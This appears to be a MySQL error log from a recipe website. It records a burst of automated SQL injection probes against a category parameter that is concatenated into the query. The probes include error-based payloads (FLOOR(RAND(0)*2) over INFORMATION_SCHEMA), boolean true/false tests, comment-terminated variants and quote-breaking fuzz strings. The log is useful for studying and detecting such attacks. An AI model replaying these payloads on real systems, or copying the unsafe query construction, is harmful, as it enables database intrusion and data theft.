+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=9604,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ZTru'='ZTru=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=9' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=9604,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('IxNv'='IxNv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=9604,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- UDwU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:44
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=9604,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:29
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || (SELECT (CASE WHEN (6977=8939) THEN 6977 ELSE 6977*(SELECT 6977 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 9375=9375 AND 'WPFD'='WPFD=0) AND d_id=file_d_id AND file_type='recipeCove' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND 9375=9375 AND 'WPFD'='WPFD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 9368=7874 AND 'NQGZ'='NQGZ=0) AND d_id=file_d_id AND file_type='recipeCove' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND 9368=7874 AND 'NQGZ'='NQGZ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND 9375=9375 AND ('XPSc'='XPSc=0) AND d_id=file_d_id AND file_type='recipeCo' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND 9375=9375 AND ('XPSc'='XPSc=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND 9094=1544 AND ('bHAw'='bHAw=0) AND d_id=file_d_id AND file_type='recipeCo' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND 9094=1544 AND ('bHAw'='bHAw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND 9375=9375-- zEdb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND 9040=3873-- FhyR=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:32:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''ZPRAlW<'">lGQlIJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'ZPRAlW<'">lGQlIJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:32:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''.),,((","=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'.),,((","=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 04:10:58
+SQLSTATE[HY000]: General error: 1210 Incorrect arguments to mysqld_stmt_execute
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 2=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC LIMIT ?, ?
